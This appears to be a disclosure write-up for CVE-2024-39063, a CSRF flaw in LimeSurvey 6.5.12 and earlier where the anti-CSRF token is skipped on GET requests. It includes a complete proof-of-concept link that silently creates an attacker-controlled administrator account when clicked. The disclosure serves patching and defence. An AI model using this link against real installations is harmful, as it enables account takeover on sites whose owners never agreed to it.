LimeSurvey <= 6.5.12 is vulnerable to Cross Site Request Forgery (CSRF). The YII_CSRF_TOKEN is only checked when passed in the body of POST requests, but the same check isn't performed in the equivalent GET requests. To exploit this vulnerability an attacker could send the following link to the victim: 

http://example.com/index.php?r=userManagement/applyedit&YII_CSRF_TOKEN=&User%5Buid%5D=&User%5Busers_name%5D=ATTACKER_USERNAME&User%5Bfull_name%5D=ATTACKER_NAME&User%5Bemail%5D=ATTACKER_EMAIL&expires=EXPIRATION_DATE&preset_password=1&User%5Bpassword%5D=ATTACKER_PASSWORD&password_repeat=ATTACKER_PASSWORD&random_example_password=vDfSU49xlEeG&YII_CSRF_TOKEN=

When the victim clicks the link, a new administrative account is created with the attacker's password:

1. CSRF Token checked in the POST request

![image](https://github.com/sysentr0py/CVEs/assets/71945854/40f39095-dbc8-4413-af0c-ffd2a36b772a)

2. CSRF Token isn't checked in the GET request

![image](https://github.com/sysentr0py/CVEs/assets/71945854/990d505e-3009-4d30-8a00-951a09b3bc56)

3. CSRF PoC with Burp Suite

![image](https://github.com/sysentr0py/CVEs/assets/71945854/dd95012b-3788-4d7c-a2a5-211200ab0df8)


4. CSRF PoC2 with Burp Suite

![image](https://github.com/sysentr0py/CVEs/assets/71945854/c1a4706e-a480-460e-8553-8baa11a23549)

References:
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-39063
- https://github.com/LimeSurvey/LimeSurvey/pull/3877
